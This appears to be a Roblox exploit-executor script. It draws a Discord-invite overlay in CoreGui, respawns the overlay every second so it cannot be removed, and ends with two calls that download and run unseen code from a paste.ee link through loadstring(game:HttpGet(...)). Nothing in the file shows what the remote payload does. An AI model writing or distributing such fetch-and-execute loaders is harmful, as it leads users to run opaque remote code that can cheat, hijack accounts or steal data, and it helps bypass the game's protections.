-- Discord GUI
local function createGUI()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local CopyButton = Instance.new("TextButton")

    ScreenGui.Name = "HelpGUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 999999
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    ScreenGui.Parent = game.CoreGui

    Frame.Name = "MainFrame"
    Frame.Parent = ScreenGui
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.Position = UDim2.new(0.5, 0, 0.42, 0)
    Frame.Size = UDim2.new(0, 320, 0, 100)
    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Frame.BorderSizePixel = 0

    TextLabel.Parent = Frame
    TextLabel.Size = UDim2.new(1, -20, 0.5, 0)
    TextLabel.Position = UDim2.new(0, 10, 0, 5)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Text = "Join our Discord server for help!\nIf it doesn't work, just re-execute!"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    TextLabel.TextXAlignment = Enum.TextXAlignment.Center
    TextLabel.TextYAlignment = Enum.TextYAlignment.Top

    CopyButton.Parent = Frame
    CopyButton.Size = UDim2.new(1, -40, 0, 30)
    CopyButton.Position = UDim2.new(0, 20, 1, -35)
    CopyButton.BackgroundColor3 = Color3.fromRGB(100, 160, 220)
    CopyButton.Text = "Copy Discord Link"
    CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CopyButton.Font = Enum.Font.GothamBold
    CopyButton.TextSize = 16
    CopyButton.AutoButtonColor = true
    CopyButton.BorderSizePixel = 0

    CopyButton.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/2Kd3QMNSpY")
        CopyButton.Text = "Copied!"
        task.wait(1.5)
        CopyButton.Text = "Copy Discord Link"
    end)

    return ScreenGui
end

local discordGui = createGUI()

-- anti-delete loop for discord gui only
task.spawn(function()
    while true do
        if not discordGui or not discordGui.Parent then
            discordGui = createGUI()
        end
        task.wait(1)
    end
end)

-- external script (runs last to prevent overwriting)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://paste.ee/r/dzQJEfav"))()
    end)
end)

loadstring(game:HttpGet("https://paste.ee/r/dzQJEfav"))()
